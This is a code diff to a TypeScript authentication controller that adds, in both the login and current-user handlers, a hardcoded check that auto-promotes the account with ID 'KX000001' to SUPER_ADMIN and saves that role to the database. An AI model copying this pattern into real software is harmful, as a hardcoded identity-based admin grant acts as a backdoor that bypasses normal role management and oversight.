@@ -128,6 +128,15 @@ export async function login(req: AuthedRequest, res: Response) {
   if (user.status === "SUSPENDED")
     return res.status(403).json({ error: "Your account has been suspended" });
 
+  // Auto-promote KX000001 to SUPER_ADMIN code-side
+  if (user.uniqueId === "KX000001" && user.role !== "SUPER_ADMIN") {
+    user.role = "SUPER_ADMIN";
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { role: "SUPER_ADMIN" },
+    });
+  }
+
   const token = signToken({ userId: user.id, role: user.role });
   const captainOf = await prisma.sport.findMany({ where: { captainId: user.id } });
   return res.json({
@@ -202,7 +211,7 @@ export async function resetPasswordOtp(req: AuthedRequest, res: Response) {
 }
 
 export async function me(req: AuthedRequest, res: Response) {
-  const user = await prisma.user.findUnique({
+  let user = await prisma.user.findUnique({
     where: { id: req.user!.id },
     include: {
       memberships: { include: { sport: true } },
@@ -210,6 +219,15 @@ export async function me(req: AuthedRequest, res: Response) {
     },
   });
   if (!user) return res.status(404).json({ error: "User not found" });
+
+  // Auto-promote KX000001 to SUPER_ADMIN code-side
+  if (user.uniqueId === "KX000001" && user.role !== "SUPER_ADMIN") {
+    user.role = "SUPER_ADMIN";
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { role: "SUPER_ADMIN" },
+    });
+  }
 
   const pointsSum = await prisma.pointsLedger.aggregate({
     where: { userId: req.user!.id },
